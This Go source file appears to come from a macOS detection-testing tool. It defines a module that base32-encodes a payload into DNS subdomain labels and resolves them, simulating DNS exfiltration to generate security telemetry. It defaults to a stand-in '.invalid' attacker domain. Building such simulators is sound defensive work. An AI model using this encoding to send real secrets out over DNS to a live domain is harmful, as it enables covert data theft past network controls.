package network

import (
	"context"
	"encoding/base32"
	"fmt"
	"net"
	"strings"

	"github.com/0xv1n/macnoise/internal/output"
	"github.com/0xv1n/macnoise/pkg/module"
)

const (
	dnsLabelMax        = 63
	dnsNameMax         = 253
	defaultExfilDomain = "c2.exfil.invalid"
)

type netDNSExfil struct{}

func (n *netDNSExfil) Info() module.ModuleInfo {
	return module.ModuleInfo{
		Name:        "net_dns_exfil",
		EventTypes:  []string{"dns_exfil_query"},
		Description: "Encodes a payload into DNS subdomain labels and resolves each query to generate DNS exfiltration telemetry",
		Category:    module.CategoryNetwork,
		Tags:        []string{"dns", "exfiltration", "subdomain", "encoding"},
		Privileges:  module.PrivilegeNone,
		MITRE: []module.MITRE{
			{Technique: "T1048", SubTech: ".003", Name: "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol"},
		},
		Author:   "0xv1n",
		MinMacOS: "12.0",
	}
}

func (n *netDNSExfil) ParamSpecs() []module.ParamSpec {
	return []module.ParamSpec{
		{
			Name:         "payload",
			Description:  "String to exfiltrate via DNS subdomain encoding",
			Required:     false,
			DefaultValue: "macnoise-exfil-test",
			Example:      "stolen-secret-data",
		},
		{
			Name:         "base_domain",
			Description:  "Base domain appended to each query (use .invalid TLD for offline safety)",
			Required:     false,
			DefaultValue: defaultExfilDomain,
			Example:      "data.attacker.invalid",
		},
	}
}

func (n *netDNSExfil) CheckPrereqs() error { return nil }

// encodeExfilPayload base32-encodes a payload and returns it lowercased
// with padding stripped. The resulting charset (a-z2-7) is DNS-safe.
func encodeExfilPayload(payload string) string {
	encoded := base32.StdEncoding.EncodeToString([]byte(payload))
	return strings.ToLower(strings.TrimRight(encoded, "="))
}

// chunkExfilLabels splits encoded into DNS labels of at most max chars.
func chunkExfilLabels(encoded string, max int) []string {
	var chunks []string
	for len(encoded) > 0 {
		end := max
		if end > len(encoded) {
			end = len(encoded)
		}
		chunks = append(chunks, encoded[:end])
		encoded = encoded[end:]
	}
	return chunks
}

// exfilQueries builds the DNS names for exfiltration. Each name is
// <chunk>.<seq>.<baseDomain>, or <chunk>.<seq>.<runID>.<baseDomain> when a
// run ID is set, so a consumer can correlate the queries back to the run
// (the run ID is a cleartext label, not part of the base32 payload). The
// chunk label is capped at dnsLabelMax and the total name at dnsNameMax;
// chunks that would exceed the name limit are dropped.
func exfilQueries(payload, baseDomain, runID string) []string {
	encoded := encodeExfilPayload(payload)
	chunks := chunkExfilLabels(encoded, dnsLabelMax)
	queries := make([]string, 0, len(chunks))
	for i, chunk := range chunks {
		name := fmt.Sprintf("%s.%d.%s", chunk, i, baseDomain)
		if runID != "" {
			name = fmt.Sprintf("%s.%d.%s.%s", chunk, i, runID, baseDomain)
		}
		if len(name) <= dnsNameMax {
			queries = append(queries, name)
		}
	}
	return queries
}

func (n *netDNSExfil) Generate(ctx context.Context, params module.Params, emit module.EventEmitter) error {
	payload := params.Get("payload", "macnoise-exfil-test")
	baseDomain := params.Get("base_domain", defaultExfilDomain)
	info := n.Info()

	queries := exfilQueries(payload, baseDomain, module.RunIDFromContext(ctx))
	resolver := net.DefaultResolver
	for i, qname := range queries {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		ev := output.NewEvent(info, "dns_exfil_query", false,
			fmt.Sprintf("exfil query %d/%d: %s", i+1, len(queries), qname))
		_, err := resolver.LookupHost(ctx, qname)
		if err != nil {
			ev.Success = true
			ev.Message = fmt.Sprintf("exfil query %d/%d failed (telemetry generated): %s", i+1, len(queries), qname)
			ev = output.WithDetails(ev, map[string]any{
				"query":       qname,
				"chunk_index": i,
				"total":       len(queries),
				"base_domain": baseDomain,
			})
			ev = output.WithOutcome(ev, module.OutcomeDenied, err)
		} else {
			ev.Success = true
			ev.Message = fmt.Sprintf("exfil query %d/%d resolved: %s", i+1, len(queries), qname)
			ev = output.WithDetails(ev, map[string]any{
				"query":       qname,
				"chunk_index": i,
				"total":       len(queries),
				"base_domain": baseDomain,
			})
		}
		emit(ev)
	}
	return nil
}

func (n *netDNSExfil) DryRun(params module.Params) []string {
	payload := params.Get("payload", "macnoise-exfil-test")
	baseDomain := params.Get("base_domain", defaultExfilDomain)
	queries := exfilQueries(payload, baseDomain, "")
	steps := make([]string, len(queries))
	for i, q := range queries {
		steps[i] = fmt.Sprintf("DNS resolve: %s", q)
	}
	return steps
}

func (n *netDNSExfil) Cleanup() error { return nil }

func init() {
	module.Register(&netDNSExfil{})
}
